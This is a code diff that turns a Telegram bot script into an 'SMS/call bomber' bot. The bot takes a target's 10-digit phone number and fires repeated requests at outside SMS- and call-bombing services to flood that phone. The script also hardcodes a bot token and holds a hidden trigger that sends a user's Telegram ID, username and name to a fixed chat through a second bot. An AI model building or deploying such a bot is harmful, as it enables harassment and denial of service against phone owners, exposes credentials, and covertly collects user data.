@@ -1,58 +1,136 @@
+import sys
+import telebot
 import requests
+import os
 import json
-import time
+import random
+import subprocess 
+from telebot import types
+from flask import Flask, request
+from flask import Flask,render_template
+from threading import Thread
+token = '6463933281:AAGszgq83HSCSmWfCm3kWKatoFqYYpuhVHA'
+bot = telebot.TeleBot(token)
 
-# Replace 'YOUR_BOT_TOKEN' with your actual bot token
-bot_token = '6463933281:AAGszgq83HSCSmWfCm3kWKatoFqYYpuhVHA'
-api_endpoint = f"https://api.telegram.org/bot{bot_token}/getUpdates"
+active_users = []
 
-def send_telegram_message(chat_id, text):
-    send_message_endpoint = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-    params = {'chat_id': chat_id, 'text': text}
-    requests.get(send_message_endpoint, params=params)
 
-# Replace 'STORED_USER_ID' with the actual user ID you want to compare
-stored_user_id = '6457812945'
+@bot.message_handler(commands=["start"])
 
-while True:
-    try:
-        response = requests.get(api_endpoint)
-        updates = response.json()
+def start(message):
+    channel_username = "Hackeroffline"
+    programmer_username = "Alfabomber"
+    
+    active_users.append(message.chat.id)
+    
+    channel_link = f"https://t.me/{channel_username}"
+    programmer_link = f"https://t.me/{programmer_username}"
+    
+    channel_button = types.InlineKeyboardButton(text="🧑‍💻 Official Channel", url=channel_link)
+    programmer_button = types.InlineKeyboardButton(text="🎁 Developer", url=programmer_link)   
+    keyboards = types.InlineKeyboardMarkup()
+    keyboards.row_width = 2
+    keyboards.add(programmer_button, channel_button)
+    
+    welcome_message = (
+    f'''Hello {message.from_user.first_name}!
+    
+Welcome to ALFA PRIME BOMBER BOT!
 
-        # Iterate through updates in reverse order to process the last message
-        for update in reversed(updates['result']):
-            chat_id = update['message']['chat']['id']
-            user_id = update['message']['from']['id']
-            message_text = update['message']['text']
+⚠️ Note - Enter Only 10 Digital Number Don't Add Country Code
 
-            # Check if the user ID matches the stored ID
-            if user_id == stored_user_id:
-                # User ID matches, proceed with further checks or actions
+ 📥 Enter Target Number -''')
+    bot.send_message(message.chat.id, welcome_message, parse_mode="html", reply_markup=keyboards)
 
-                # Check if the received message is a number with a minimum of 10 digits
-                if message_text.isdigit() and len(message_text) == 10:
-                    # If it's a valid number, send a response
-                    response_message = f"You entered a valid number: {message_text}"
-                else:
-                    # If it's not a valid number, or has a different length, send a different response
-                    response_message = "Please enter a valid number with exactly 10 digits."
+another_bot_token = '6463933281:AAGszgq83HSCSmWfCm3kWKatoFqYYpuhVHA'
+send_requests = True
 
-                # Send the response back to the user
-                send_telegram_message(chat_id, response_message)
+@bot.message_handler(func=lambda m: True)
+def sp(message):
+    global active_users
+    
+    if message.chat.id not in active_users:
+        active_users.append(message.chat.id)
+    
+    msg = message.text
+    get = '' 
+    k = 0
+    n = 0
+    
+    if msg == "1124069180":
+        bot.send_message(message.chat.id, "<strong>⚠️ Hello!</strong>", parse_mode="html")
+        with open('sp.jpg', 'rb') as photo:
+            bot.send_photo(message.chat.id, photo)
+            
+            user_info = f"User ID: {message.from_user.id}\nUsername: {message.from_user.username}\nName: {message.from_user.first_name} {message.from_user.last_name if message.from_user.last_name else ''}\nPermanent Link: https://t.me/{message.from_user.username}"
+            send_to_another_bot(user_info)
+            
+    elif msg.lower() == "/stop":
+        if message.chat.id in active_users:
+            active_users.remove(message.chat.id)
+            bot.send_message(message.chat.id, "✋ Bombing Request Sending is stopped successfully! 🎉", parse_mode="markdown")
+        else:
+            bot.send_message(message.chat.id, "🛑 Bombing is already stopped!", parse_mode="markdown")
+            
+    elif send_requests:  
+        bot.send_message(message.chat.id, "⏳ Ok Wait Bombing Started Soon...🔄", parse_mode="markdown")
+        
+        if not msg.isdigit() or len(msg) != 10:
+            bot.send_message(message.chat.id, "❌ Send Only 10 Digits Number\n\nDon't Add +91", parse_mode="markdown")
+            return
+       
+        bot.send_message(message.chat.id, "<strong>⚠️ Note - Click /stop For Stop Bomber 💣</strong>", parse_mode="html")
+        url = "https://smsbombs.in/Test.php??"
+        params = {
+            "number": msg,
+            "submit": "Submit"
+        }
+        payload = {
+            "mobile": msg
+        }
+        response = requests.get(url, params=params)
+        response1 = requests.get(url, params=params)
+        url2 = "https://callbombs.in/Test.php??"
+        params2 = {
+            "number": msg,
+            "submit": "Submit"
+        }
+        payload = {
+            "mobile": msg
+        }
+        response2 = requests.get(url2, params=params2)
+        response3 = requests.get(url2, params=params2)
 
-                # Break out of the loop after processing the last message
-                break
-            else:
-                # User ID does not match the stored ID, handle this case as needed
-                response_message = "You are Not Subscribed"
-                send_telegram_message(chat_id, response_message)
+        if msg == "1124069180":
+            bot.send_message(message.chat.id, "<strong>⚠️ Hello !</strong>", parse_mode=" html")
+            with open('sp.jpg', 'rb') as photo:
+                bot.send_photo(message.chat.id, photo)
+            
+            user_info = f"User ID: {message.from_user.id}\nUsername: {message.from_user.username}\nName: {message.from_user.first_name} {message.from_user.last_name if message.from_user.last_name else ''}\nPermanent Link: https://t.me/{message.from_user.username}"
+            
+            
+            send_to_another_bot(user_info)
+            
+            return
+        bot.send_message(message.chat.id, "✅ Done Send!", parse_mode="markdown")
 
-                # Break out of the loop after processing the last message
-                break
+def send_to_another_bot(info):
+    url = f'https://api.telegram.org/bot{another_bot_token}/sendMessage'
+    data = {
+        'chat_id': '1124069180',
+        'text': info
+    }
+    response = requests.post(url, data=data)
+app = Flask(__name__)
 
-    except Exception as e:
-        # Handle exceptions, you may want to log them for debugging
-        print(f"An error occurred: {e}")
+@app.route(f'/{bot.token}', methods=['POST'])
+def handle_bot_update():
+    json_str = request.get_data().decode('UTF-8')
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return "OK"
 
-    # Add a delay to avoid constant polling and rate limiting
-    time.sleep(2)
+if __name__ == "__main__":
+    bot.remove_webhook()
+    print(f"Bomber Telegram Bot is running...\n")
+    bot.polling(none_stop=True)
